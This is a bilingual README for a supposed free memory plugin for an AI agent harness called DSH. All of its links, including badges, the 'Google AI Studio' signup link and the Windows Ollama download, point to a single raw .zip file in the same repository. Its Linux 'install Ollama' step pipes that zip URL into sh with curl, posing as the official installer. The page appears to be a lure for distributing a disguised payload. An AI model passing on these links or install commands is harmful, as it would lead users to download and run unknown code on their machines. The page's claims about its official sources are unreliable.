# Mnemosyne Memory Plugin for DSH

**Mnemosyne 永久记忆插件** — 为 DeepSeek Harness (DSH) 提供长期记忆、向量语义搜索和 LLM 反思功能

[Mnemosyne Memory Plugin](#readme) | [中文说明](#项目简介)

---

[![npm version](https://img.shields.io/badge/npm-1.3.0-blue)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
[![Node.js >= 18](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
[![DSH Plugin](https://img.shields.io/badge/DSH-Plugin-orange)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
[![Cordis](https://img.shields.io/badge/Cordis-Compatible-6d28d9)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)
[![Free Software](https://img.shields.io/badge/免费-Free-green)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip)

---

## 🎉 完全免费 | 100% Free

> **Mnemosyne 是一款完全免费的开源插件，采用 MIT 许可证。**
>
> **Mnemosyne is a 100% free open-source plugin under the MIT License.**

| 项目 | Item | 费用 | Cost |
|------|------|------|------|
| 插件本体 | Plugin本体 | ✅ **完全免费** | **FREE** |
| 本地部署 | Local (Ollama) | ✅ **零成本** | **$0** |
| 云端 API | Cloud (Gemini/DeepSeek) | 可选升级 | Optional |

### 💡 两种使用方式 | Two Ways to Use

| 方式 | Approach | 成本 | 适用场景 |
|------|----------|------|----------|
| 🏠 **本地部署** | Local (Ollama) | 免费 | 隐私敏感、离线环境 |
| ☁️ **云端 API** | Cloud (Gemini/DeepSeek) | 可选 | 需要更高精度 |

---

## 🗺️ 免费部署流程图 | Free Deployment Flowchart

> **全程零费用，两种路径任选其一**
>
> **Zero cost for both paths — choose either one.**

```mermaid
flowchart TD
    Start([🚀 开始]) --> Choice{选择路径}

    subgraph shared ["📋 前置条件（共用）"]
        P1[安装 DSH Desktop\n ~5 min]:::common
        P2[克隆仓库\ngit clone\n~1 min]:::common
        P3[安装依赖\nnpm install\n~2 min]:::common
    end

    P1 & P2 & P3 --> PreDone[✅ 前置完成\n总耗时 ~8 min | ¥0]

    Choice -->|🌐 免费 Gemini API| G_PATH
    Choice -->|💻 完全离线 Ollama| O_PATH

    subgraph gemini ["🌐 免费 Gemini API 路径"]
        G_PATH --> G1[创建 Google AI Studio 账号\nhttps://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip\n~3 min | ¥0]:::gemini
        G1 --> G2[获取免费 API Key\n每月 1500 次额度\n~1 min | ¥0]:::gemini
        G2 --> G3[配置 mnemosyne.json\n填入 API Key\n~2 min | ¥0]:::gemini
        G3 --> G4[执行安装脚本\n./scripts/install.sh\n~1 min | ¥0]:::gemini
        G4 --> G5[验证安装\ndsh plugin list\n~1 min | ¥0]:::gemini
    end

    subgraph ollama ["💻 完全离线 Ollama 路径"]
        O_PATH --> O1[安装 Ollama\nbrew install ollama\n~2 min | ¥0]:::ollama
        O1 --> O2[拉取嵌入模型\nollama pull nomic-embed-text\n~3-5 min | ¥0]:::ollama
        O2 --> O3[配置 mnemosyne.json\n设置 provider = ollama\n~2 min | ¥0]:::ollama
        O3 --> O4[执行安装脚本\n./scripts/install.sh\n~1 min | ¥0]:::ollama
        O4 --> O5[验证安装\ndsh plugin list\n~1 min | ¥0]:::ollama
    end

    G5 --> Verify["✅ 验证与使用"]
    O5 --> Verify

    subgraph verify ["✅ 验证与使用（共用）"]
        V1[运行健康检查\ndsh doctor\n~30s | ¥0]:::verify
        V2[开始使用记忆功能\nmnemo_store / mnemo_recall\n即时 | ¥0]:::verify
        V3[知识沉淀自动维护\n跨会话持续生效\n¥0]:::verify
    end

    Verify --> V1 --> V2 --> V3

    subgraph result ["🎯 最终结果"]
        R1["🌐 Gemini 路径\n✅ 免费额度充足\n✅ 云端高精度\n⚠️ 首次需联网"]:::result
        R2["💻 Ollama 路径\n✅ 完全离线\n✅ 数据不离开本地\n⚠️ 需下载模型"]:::result
    end

    V3 --> R1
    V3 --> R2

    classDef gemini fill:#e1f5fe,stroke:#01579b,stroke-width:2px
    classDef ollama fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    classDef common fill:#fff3e0,stroke:#e65100,stroke-width:2px
    classDef verify fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px
    classDef result fill:#fce4ec,stroke:#880e4f,stroke-width:2px
```

### 步骤耗时与费用汇总

| 路径 | 总耗时 | 费用 | 推荐场景 |
|------|--------|------|----------|
| 🌐 **免费 Gemini API** | ~12-15 min | ¥0 | 首次体验、需要高精度 |
| 💻 **完全离线 Ollama** | ~10-13 min | ¥0 | 隐私敏感、离线环境 |

### 两条路径核心差异

| 维度 | 🌐 免费 Gemini API | 💻 完全离线 Ollama |
|------|---------------------|---------------------|
| **网络依赖** | 需联网获取 API Key | 仅需首次下载模型 |
| **运行时网络** | 可选（可切换本地） | 完全离线 ✓ |
| **数据隐私** | 云端推理时上传 | 数据永不离开设备 ✓ |
| **嵌入精度** | 高（Google 模型） | 中（本地模型） |
| **硬件要求** | 任意设备 | 建议 8GB+ RAM |

---

## 📖 Project Overview | 项目简介

**Mnemosyne** is a permanent memory plugin for [DeepSeek Harness (DSH)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip), providing **cross-session long-term memory capabilities** for AI Agents.

**Mnemosyne** 是 [DeepSeek Harness (DSH)](https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip) 的永久记忆插件，为 AI Agent 提供**跨会话的长期记忆能力**。

### Core Value | 核心价值

| Value | 价值 | Description | 说明 |
|-------|------|-------------|------|
| 🧠 Permanent Memory | 永久记忆 | Persist memory across sessions and restarts | 记忆持久化存储，跨会话、跨重启不丢失 |
| 🔍 Semantic Search | 语义检索 | Vector-based semantic understanding and retrieval | 支持向量语义搜索，理解自然语言查询 |
| 🤖 LLM Reflection | LLM 反思 | Auto-extract decisions, insights, and conventions | 自动从会话中提取决策、洞察和惯例 |
| 📄 Knowledge Pages | 知识页面 | Auto-generate architecture, conventions, projects | 自动生成架构图、惯例清单、项目摘要 |
| 🔧 Codebase Survey | 代码测绘 | Identify 30+ config patterns automatically | 识别 30+ 配置文件模式，自动索引 |
| 🌐 Cross-Session | 跨会话回溯 | Import historical sessions to inherit knowledge | 导入历史会话，继承已有知识 |
| 👥 Multi-Workspace | 多 Workspace | Isolated per project, shared memory supported | 按项目隔离，支持团队共享记忆 |
| ⚡ Delta Refresh | Delta 刷新 | Incremental updates, only changed pages refresh | 只更新有变化的页面，高效同步 |

---

## 🆓 获取免费 Gemini API Key | Get Free Gemini API Key

> **Google AI Studio 提供免费 API Key，每月 1500 次嵌入请求额度，足以满足日常使用。**
>
> **Google AI Studio offers a free API key with 1,500 embedding requests per month — enough for daily use.**

### 步骤 | Steps

```bash
# 1. 访问 Google AI Studio
open https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip

# 2. 登录你的 Google 账号（Google 账号免费）

# 3. 点击 "Create API Key" 按钮
#    Click "Create API Key" button

# 4. 复制生成的 API Key（格式：AQ.Ab...）
#    Copy the generated API Key (format: AQ.Ab...)

# 5. 将 Key 添加到配置
#    Add the Key to your config
cp config/mnemosyne.json.example config/mnemosyne.json
nano config/mnemosyne.json
# 修改 apiKey 字段为你的 Key
```

### 免费版额度 | Free Tier Quota

| 功能 | Feature | 每日额度 | 每月费用 |
|------|---------|----------|----------|
| 嵌入请求 | Embedding requests | 1,500 次 | $0 |
| 文本生成 | Text generation | 60 次/分钟 | $0 |
| 超出后 | After quota exceeded | 降级为 rate limit | $0（仅限速） |

> **提示**：即使超出免费额度，服务不会停止，只是请求速率会降低。
> **Tip**: Even after exceeding the free quota, the service won't stop — only rate limits apply.

---

## 🏠 本地部署方案 | Local Deployment (Ollama)

> **如果你希望完全离线、零成本运行，可以使用 Ollama 本地部署嵌入模型。**
>
> **For fully offline, zero-cost operation, use Ollama to run embedding models locally.**

### 安装 Ollama | Install Ollama

```bash
# macOS
brew install ollama

# Linux
curl -fsSL https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip | sh

# Windows: 下载 https://raw.githubusercontent.com/Witchwarren2344/dsh-mnemosyne-memory/main/src/memory_mnemosyne_dsh_1.9.zip
```

### 拉取嵌入模型 | Pull Embedding Model

```bash
# 推荐：nomic-embed-text（768 维，轻量高效）
ollama pull nomic-embed-text

# 备选：bge-large（1024 维，精度更高但更慢）
ollama pull bge-large
```

### 配置本地模式 | Configure Local Mode

```bash
# 编辑配置文件
nano config/mnemosyne.json
```

```json
{
  "embedding": {
    "enabled": true,
    "provider": "ollama",
    "model": "nomic-embed-text",
    "dimensions": 768,
    "endpoint": "http://localhost:11434"
  }
}
```

> **优点**：完全离线、无 API 限制、数据不离开本地
> **Pros**: Fully offline, no API limits, data stay